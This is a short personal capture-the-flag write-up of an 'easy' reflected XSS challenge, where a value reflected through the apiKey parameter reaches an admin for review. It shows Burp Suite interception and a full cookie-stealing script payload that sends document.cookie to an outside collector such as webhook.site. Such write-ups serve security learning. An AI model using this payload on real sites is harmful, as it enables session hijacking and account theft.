Although it's label as easy, but i took me hours just to grasp it so i'm writing a writeup for my own sake. huhuhuhuhuh

![Screenshot 2024-07-27 143941](https://github.com/user-attachments/assets/51cc83db-e9f0-4bfb-848f-9f93ea172cee)

Hint 1: Try to change the parameter<br />
Hint 2: Try to steal admin's cookie<br />

## Exploration
I found out that we could trigger alert function by inserting script into url under ```apiKey``` parameter.
<br>![image](https://github.com/user-attachments/assets/4a93194b-e8d5-45bb-8cd5-de91d865e07f)<br />
<br>let's also look into the page source. <br />

![image](https://github.com/user-attachments/assets/bb5d0b70-3da9-4713-9027-01623e780585)<br />
<br>In this function, the xss payload is reflected on to the html code of the website. That's why we could trigger an alert function

![image](https://github.com/user-attachments/assets/c2a59d25-293b-4a6d-ac70-5cb5a068ad29)<br />
<br>In this function, the ```apiKey``` parameter value is being sent to admin for review. 
Therefore, we can insert xss payload that could steal cookies.

## Solution
### Step 1: Intercept traffic of reportAdmin() using Burp Suite and send to Repeater
![image](https://github.com/user-attachments/assets/6c1f8983-b585-4bd2-9f95-478dc607b1ac)
![image](https://github.com/user-attachments/assets/62d9d43e-5541-4bbf-bcc6-39edc43569b3)
![image](https://github.com/user-attachments/assets/3ea11497-1515-4bf5-af74-e89f03db0c0a)

### Step 2: Craft the XSS Injection Payload to steal admin cookies<br />
In order for it to work, we need to make the payload into hex format. (Because ```reportAdmin()``` function has encodeURIComponent(), I'm guessing there's also one in the server script)
<br>We can do this with Burp Suite in-build encoder and decoder.
We are going to use a very standard cookie stealing payload
</script><script>location.href="[URL]?c"+document.cookie</script>
The URL is being used to specify a location return values. We can use any free online hosting services like https://webhook.site/
![image](https://github.com/user-attachments/assets/94f6dafb-986d-4e1b-98e7-22c2b7906392)

### Step 3: Send the payload to admin
![image](https://github.com/user-attachments/assets/8c4af8f7-5b72-47d9-b5f9-1a050223a948)
![image](https://github.com/user-attachments/assets/4d88accc-d206-4a9f-a964-379157081ae1)
TA-DA! we got flag!
